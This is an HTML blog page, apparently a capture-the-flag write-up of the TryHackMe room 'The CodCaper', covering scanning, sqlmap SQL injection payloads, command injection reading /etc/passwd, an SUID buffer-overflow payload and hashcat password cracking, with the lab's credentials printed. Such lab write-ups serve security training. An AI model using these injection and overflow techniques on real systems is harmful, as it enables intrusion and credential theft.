@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="nair0lf32 ">
+<meta name="description" content="The CodCaper Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDs2k31WKwi9eUwlvpMuWNMzFjChpDu4IcM3k6VLyq3IEnYuZl2lL/dMWVGCKPfnJ1yv2IZVk1KXha7nSIR4yxExRDx7Ybi7ryLUP/XTrLtBwdtJZB7k48EuS8okvYLk4ppG1MRvrVojNPprF4nh5S0EEOowqGoiHUnGWOzYSgvaLAgvr7ivZxSsFCLqvdmieErVrczCBOqDOcPH9ZD/q6WalyHMccZWVL3Gk5NmHPaYDd9ozVHCMHLq7brYxKrUcoOtDhX7btNamf&#43;PxdH5I9opt6aLCjTTLsBPO2v5qZYPm1Rod64nysurgnEKe&#43;e4ZNbsCvTc1AaYKVC&#43;oguSNmT| 256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAmpmAEGyFxyUqlKmlCnCeQW4KXOpnSG6SwmjD5tGSoYaz5Fh1SFMNP0/KNZUStQK9KJmz1vLeKI03nLjIR1sho=| 256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBIRpiANvrp1KboZ6vAeOeYL68yOjT0wbxgiavv10kC80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf :: Method : GET:: URL : http://10." />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/the-codcaper/the-codcaper/" />
+
+
+    <title>
+        
+             :: Zer0ne  — welcome friend
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
+    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
+    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="">
+<meta itemprop="description" content="The CodCaper Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDs2k31WKwi9eUwlvpMuWNMzFjChpDu4IcM3k6VLyq3IEnYuZl2lL/dMWVGCKPfnJ1yv2IZVk1KXha7nSIR4yxExRDx7Ybi7ryLUP/XTrLtBwdtJZB7k48EuS8okvYLk4ppG1MRvrVojNPprF4nh5S0EEOowqGoiHUnGWOzYSgvaLAgvr7ivZxSsFCLqvdmieErVrczCBOqDOcPH9ZD/q6WalyHMccZWVL3Gk5NmHPaYDd9ozVHCMHLq7brYxKrUcoOtDhX7btNamf&#43;PxdH5I9opt6aLCjTTLsBPO2v5qZYPm1Rod64nysurgnEKe&#43;e4ZNbsCvTc1AaYKVC&#43;oguSNmT| 256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAmpmAEGyFxyUqlKmlCnCeQW4KXOpnSG6SwmjD5tGSoYaz5Fh1SFMNP0/KNZUStQK9KJmz1vLeKI03nLjIR1sho=| 256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBIRpiANvrp1KboZ6vAeOeYL68yOjT0wbxgiavv10kC80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf :: Method : GET:: URL : http://10.">
+
+<meta itemprop="wordCount" content="971"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>
+
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="The CodCaper Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDs2k31WKwi9eUwlvpMuWNMzFjChpDu4IcM3k6VLyq3IEnYuZl2lL/dMWVGCKPfnJ1yv2IZVk1KXha7nSIR4yxExRDx7Ybi7ryLUP/XTrLtBwdtJZB7k48EuS8okvYLk4ppG1MRvrVojNPprF4nh5S0EEOowqGoiHUnGWOzYSgvaLAgvr7ivZxSsFCLqvdmieErVrczCBOqDOcPH9ZD/q6WalyHMccZWVL3Gk5NmHPaYDd9ozVHCMHLq7brYxKrUcoOtDhX7btNamf&#43;PxdH5I9opt6aLCjTTLsBPO2v5qZYPm1Rod64nysurgnEKe&#43;e4ZNbsCvTc1AaYKVC&#43;oguSNmT| 256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAmpmAEGyFxyUqlKmlCnCeQW4KXOpnSG6SwmjD5tGSoYaz5Fh1SFMNP0/KNZUStQK9KJmz1vLeKI03nLjIR1sho=| 256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBIRpiANvrp1KboZ6vAeOeYL68yOjT0wbxgiavv10kC80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf :: Method : GET:: URL : http://10."/>
+
+
+
+    <meta property="og:title" content="" />
+<meta property="og:description" content="The CodCaper Enumeration nmap PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDs2k31WKwi9eUwlvpMuWNMzFjChpDu4IcM3k6VLyq3IEnYuZl2lL/dMWVGCKPfnJ1yv2IZVk1KXha7nSIR4yxExRDx7Ybi7ryLUP/XTrLtBwdtJZB7k48EuS8okvYLk4ppG1MRvrVojNPprF4nh5S0EEOowqGoiHUnGWOzYSgvaLAgvr7ivZxSsFCLqvdmieErVrczCBOqDOcPH9ZD/q6WalyHMccZWVL3Gk5NmHPaYDd9ozVHCMHLq7brYxKrUcoOtDhX7btNamf&#43;PxdH5I9opt6aLCjTTLsBPO2v5qZYPm1Rod64nysurgnEKe&#43;e4ZNbsCvTc1AaYKVC&#43;oguSNmT| 256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAmpmAEGyFxyUqlKmlCnCeQW4KXOpnSG6SwmjD5tGSoYaz5Fh1SFMNP0/KNZUStQK9KJmz1vLeKI03nLjIR1sho=| 256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBIRpiANvrp1KboZ6vAeOeYL68yOjT0wbxgiavv10kC80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works| http-methods:|_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.18 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ffuf :: Method : GET:: URL : http://10." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/the-codcaper/the-codcaper/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
+
+<meta property="og:site_name" content="Zer0ne" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">Zer0ne #</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#0FF00D;
+                   animation-duration:2s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/the-codcaper/the-codcaper/"></a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <h1 id="the-codcaper">The CodCaper</h1>
+<!-- raw HTML omitted -->
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="nmap">nmap</h3>
+<pre tabindex="0"><code>PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 6d:2c:40:1b:6c:15:7c:fc:bf:9b:55:22:61:2a:56:fc (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDs2k31WKwi9eUwlvpMuWNMzFjChpDu4IcM3k6VLyq3IEnYuZl2lL/dMWVGCKPfnJ1yv2IZVk1KXha7nSIR4yxExRDx7Ybi7ryLUP/XTrLtBwdtJZB7k48EuS8okvYLk4ppG1MRvrVojNPprF4nh5S0EEOowqGoiHUnGWOzYSgvaLAgvr7ivZxSsFCLqvdmieErVrczCBOqDOcPH9ZD/q6WalyHMccZWVL3Gk5NmHPaYDd9ozVHCMHLq7brYxKrUcoOtDhX7btNamf+PxdH5I9opt6aLCjTTLsBPO2v5qZYPm1Rod64nysurgnEKe+e4ZNbsCvTc1AaYKVC+oguSNmT
+|   256 ff:89:32:98:f4:77:9c:09:39:f5:af:4a:4f:08:d6:f5 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAmpmAEGyFxyUqlKmlCnCeQW4KXOpnSG6SwmjD5tGSoYaz5Fh1SFMNP0/KNZUStQK9KJmz1vLeKI03nLjIR1sho=
+|   256 89:92:63:e7:1d:2b:3a:af:6c:f9:39:56:5b:55:7e:f9 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFBIRpiANvrp1KboZ6vAeOeYL68yOjT0wbxgiavv10kC
+80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre><h3 id="ffuf">ffuf</h3>
+<pre tabindex="0"><code> :: Method           : GET
+ :: URL              : http://10.10.5.111/FUZZ.php
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ ________________________________________________
+
+ .hta                    [Status: 403, Size: 276, Words: 20, Lines: 10]
+ .htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10]
+ .htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10]
+ [Status: 403, Size: 276, Words: 20, Lines: 10]
+ administrator           [Status: 200, Size: 409, Words: 53, Lines: 22]
+</code></pre><p>its guided room&hellip;so speedrun</p>
+<p>obvious sql injection</p>
+<pre tabindex="0"><code>sqlmap -u http://10.10.5.111/administrator.php --forms --dump
+
+Parameter: username (POST)
+Type: boolean-based blind
+Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+Payload: username=iewm&#39; RLIKE (SELECT (CASE WHEN (6931=6931) THEN 0x6965776d ELSE 0x28 END))-- pxHY&amp;password=
+
+Type: error-based
+Title: MySQL &gt;= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
+Payload: username=iewm&#39; AND GTID_SUBSET(CONCAT(0x7178787a71,(SELECT (ELT(1090=1090,1))),0x7171767871),1090)-- qgeV&amp;password=
+
+Type: time-based blind
+Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
+Payload: username=iewm&#39; AND (SELECT 7299 FROM (SELECT(SLEEP(5)))IoDT)-- SNGS&amp;password=
+
+---
+
+Database: users
+Table: users
+[1 entry]
++------------+----------+
+| password | username |
++------------+----------+
+| secretpass | pingudad |
++------------+----------+
+</code></pre><p>After login the rce input says &ldquo;command&rdquo;&hellip;bruh we know its RCE but damn that was direct</p>
+<pre tabindex="0"><code>ls
+
+2591c98b70119fe624898b1e424b5e91.php administrator.php index.html index.html
+</code></pre><pre tabindex="0"><code>cat /etc/passwd
+
+root❌0:0:root:/root:/bin/bash daemon❌1:1:daemon:/usr/sbin:/usr/sbin/nologin bin❌2:2:bin:/bin:/usr/sbin/nologin sys❌3:3:sys:/dev:/usr/sbin/nologin sync❌4:65534:sync:/bin:/bin/sync games❌5:60:games:/usr/games:/usr/sbin/nologin man❌6:12:man:/var/cache/man:/usr/sbin/nologin lp❌7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail❌8:8:mail:/var/mail:/usr/sbin/nologin news❌9:9:news:/var/spool/news:/usr/sbin/nologin uucp❌10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy❌13:13:proxy:/bin:/usr/sbin/nologin www-data❌33:33:www-data:/var/www:/usr/sbin/nologin backup❌34:34:backup:/var/backups:/usr/sbin/nologin list❌38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc❌39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats❌41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody❌65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync❌100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network❌101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve❌102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy❌103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog❌104:108::/home/syslog:/bin/false \_apt❌105:65534::/nonexistent:/bin/false messagebus❌106:110::/var/run/dbus:/bin/false uuidd❌107:111::/run/uuidd:/bin/false papa❌1000:1000:qaa:/home/papa:/bin/bash mysql❌108:116:MySQL Server,,,:/nonexistent:/bin/false sshd❌109:65534::/var/run/sshd:/usr/sbin/nologin pingu❌1002:1002::/home/pingu:/bin/bash pingu❌1002:1002::/home/pingu:/bin/bash
+</code></pre><p>pingu and papa are users</p>
+<p>At this point we could just use a shell to get inside but I want to do it the other way</p>
+<p><code>find / -type f -user pingu</code></p>
+<pre tabindex="0"><code>/home/pingu/.cache/motd.legal-displayed /home/pingu/.ssh/id_rsa /home/pingu/.ssh/id_rsa.pub /home/pingu/.gdb_history /home/pingu/.pwntools-cache-2.7/update /home/pingu/.pwntools-cache-2.7/update
+</code></pre><p><code>find / -type f -user papa</code></p>
+<pre tabindex="0"><code>/home/papa/.bash_history /home/papa/.bash_logout /home/papa/.profile /home/papa/.bashrc /home/papa/.sudo_as_admin_successful /home/papa/.pwntools-cache-2.7/update /var/backups/shadow.bak /var/backups/shadow.bak
+</code></pre><p>Ah..I may be doing this wrong</p>
+<p>Assuming we have access to the file let&rsquo;s try this</p>
+<p><code>find / -user www-data</code></p>
+<p>Among a thousand files&hellip;the last ones are interresting</p>
+<pre tabindex="0"><code>...
+/var/hidden/pass /var/hidden/pass
+</code></pre><p><code>cat /var/hidden/pass</code></p>
+<pre tabindex="0"><code>pinguapingu pinguapingu
+</code></pre><p>so..ssh creds are</p>
+<p><code>pingu : pinguapingu</code></p>
+<p>I am not a big fan of privesc scripts but hey..let&rsquo;s load that noisy linenum</p>
+<p><code>scp LinEnum.sh pingu@10.10.8.121:/tmp</code></p>
+<pre tabindex="0"><code>....
+
+[-] SUID files:
+-r-sr-xr-x 1 root papa 7516 Jan 16 2020 /opt/secret/root
+-rwsr-xr-x 1 root root 136808 Jul 4 2017 /usr/bin/sudo
+-rwsr-xr-x 1 root root 10624 May 8 2018 /usr/bin/vmware-user-suid-wrapper
+-rwsr-xr-x 1 root root 40432 May 16 2017 /usr/bin/chsh
+-rwsr-xr-x 1 root root 54256 May 16 2017 /usr/bin/passwd
+-rwsr-xr-x 1 root root 75304 May 16 2017 /usr/bin/gpasswd
+-rwsr-xr-x 1 root root 39904 May 16 2017 /usr/bin/newgrp
+-rwsr-xr-x 1 root root 49584 May 16 2017 /usr/bin/chfn
+-rwsr-xr-x 1 root root 428240 Mar 4 2019 /usr/lib/openssh/ssh-keysign
+-rwsr-xr-x 1 root root 10232 Mar 27 2017 /usr/lib/eject/dmcrypt-get-device
+-rwsr-xr-- 1 root messagebus 42992 Jan 12 2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+-rwsr-xr-x 1 root root 44168 May 7 2014 /bin/ping
+-rwsr-xr-x 1 root root 40128 May 16 2017 /bin/su
+-rwsr-xr-x 1 root root 44680 May 7 2014 /bin/ping6
+-rwsr-xr-x 1 root root 142032 Jan 28 2017 /bin/ntfs-3g
+-rwsr-xr-x 1 root root 40152 May 16 2018 /bin/mount
+-rwsr-xr-x 1 root root 30800 Jul 12 2016 /bin/fusermount
+-rwsr-xr-x 1 root root 27608 May 16 2018 /bin/umount
+
+....
+</code></pre><p>yeah definitelly <code>/opt/secret/root</code></p>
+<p>Oh cool the binary exploitation part</p>
+<p><code>gdb /opt/secret/root</code> (I need pwndbg too)</p>
+<p>we run cyclic input to pass 50 characters when the program expects 32</p>
+<pre tabindex="0"><code>r &lt; &lt;(cyclic 50)
+
+Program received signal SIGSEGV, Segmentation fault.
+0x6161616c in ?? ()
+LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+EAX 0x1
+EBX 0x0
+ECX 0x1
+EDX 0xf779b87c (_IO_stdfile_0_lock) ◂— 0
+EDI 0xf779a000 (\_GLOBAL_OFFSET_TABLE_) ◂— mov al, 0x1d /_ 0x1b1db0 _/
+ESI 0xf779a000 (_GLOBAL_OFFSET_TABLE_) ◂— mov al, 0x1d /_ 0x1b1db0 _/
+EBP 0x6161616b (&#39;kaaa&#39;)
+ESP 0xffdfeb10 ◂— 0xf700616d /_ &#39;ma&#39; _/
+EIP 0x6161616c (&#39;laaa&#39;)
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+Invalid address 0x6161616c
+
+00:0000│ esp 0xffdfeb10 ◂— 0xf700616d /_ &#39;ma&#39; _/
+01:0004│ 0xffdfeb14 —▸ 0xffdfeb30 ◂— 0x1
+02:0008│ 0xffdfeb18 ◂— 0x0
+03:000c│ 0xffdfeb1c —▸ 0xf7600637 (**libc*start_main+247) ◂— add esp, 0x10
+04:0010│ 0xffdfeb20 —▸ 0xf779a000 (\_GLOBAL_OFFSET_TABLE*) ◂— mov al, 0x1d /_ 0x1b1db0 _/
+... ↓
+06:0018│ 0xffdfeb28 ◂— 0x0
+07:001c│ 0xffdfeb2c —▸ 0xf7600637 (**libc_start_main+247) ◂— add esp, 0x10
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+► f 0 6161616c
+f 1 f700616d
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+Program received signal SIGSEGV (fault address 0x6161616c)
+</code></pre><p>heh&hellip;segfault at 0x6161616c&hellip;trying to overwrite EIP</p>
+<p><code>pwndbg&gt; cyclic -l 0x6161616c</code></p>
+<pre tabindex="0"><code>44
+</code></pre><p>we need 44 chars to overwrte EIP</p>
+<p>I chose the manual way over pwntools but both are handy</p>
+<pre tabindex="0"><code>pwndbg&gt; disassemble shell
+Dump of assembler code for function shell:
+0x080484cb &lt;+0&gt;: push ebp
+0x080484cc &lt;+1&gt;: mov ebp,esp
+0x080484ce &lt;+3&gt;: sub esp,0x8
+0x080484d1 &lt;+6&gt;: sub esp,0xc
+0x080484d4 &lt;+9&gt;: push 0x3e8
+0x080484d9 &lt;+14&gt;: call 0x80483a0 &lt;setuid@plt&gt;
+0x080484de &lt;+19&gt;: add esp,0x10
+0x080484e1 &lt;+22&gt;: sub esp,0xc
+0x080484e4 &lt;+25&gt;: push 0x3e8
+0x080484e9 &lt;+30&gt;: call 0x8048370 &lt;setgid@plt&gt;
+0x080484ee &lt;+35&gt;: add esp,0x10
+0x080484f1 &lt;+38&gt;: sub esp,0xc
+0x080484f4 &lt;+41&gt;: push 0x80485d0
+0x080484f9 &lt;+46&gt;: call 0x8048380 &lt;system@plt&gt;
+0x080484fe &lt;+51&gt;: add esp,0x10
+0x08048501 &lt;+54&gt;: nop
+0x08048502 &lt;+55&gt;: leave
+0x08048503 &lt;+56&gt;: ret
+End of assembler dump.
+</code></pre><p>we import struct to convert the addredd to little endian (can be done manually then inserted)</p>
+<p><code>python -c 'import struct;print &quot;A&quot;\*44 + struct.pack(&quot;&lt;I&quot;,0x080484cb)'</code></p>
+<p>And pipe it to the program&hellip;to reveal the hashed password</p>
+<p><code>python -c 'import struct;print &quot;A&quot;\*44 + struct.pack(&quot;&lt;I&quot;,0x080484cb)' | /opt/secret/root</code></p>
+<p>I need to learn assembly ASAP</p>
+<pre tabindex="0"><code>$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.
+</code></pre><p>Might be SHA-512&hellip;so hashcat mode..1800?</p>
+<pre tabindex="0"><code>hashcat -m 1800 &#39;$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.&#39; /usr/share/wordlists/rockyou.txt
+</code></pre><p>cracked! password is <code>love2fish</code></p>
+<p>noot noot</p>
+
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>&copy; 2022</span>
+            <span><a href="https://nair0lf32.github.io/zer0ne">nair0lf32</a></span>
+            <span><a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC BY-NC 4.0</a></span>
+            <span><a href="https://nair0lf32.github.io/zer0ne/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
+            
+        </div>
+    </div>
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <a href="https://gohugo.io/">Hugo</a></span><span>Made with &#10084; by <a href="https://github.com/nair0lf32">nair0lf32</a></span><span>Theme used: <a href="https://github.com/rhazdon/hugo-theme-hello-friend-ng">Hello-friend-ng</a></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://nair0lf32.github.io/zer0ne/bundle.min.cf7fb2a9e24608a783e05e4472da2fdf008293289de1ad88d1cba5c143e7e414496dd33b6a228e92f8461ce0c8cbad3c9f9847e73e46dfbce0463393ddd1733a.js" integrity="sha512-z3&#43;yqeJGCKeD4F5Ectov3wCCkyid4a2I0culwUPn5BRJbdM7aiKOkvhGHODIy608n5hH5z5G37zgRjOT3dFzOg=="></script>
+
+
+
+    </body>
+</html>
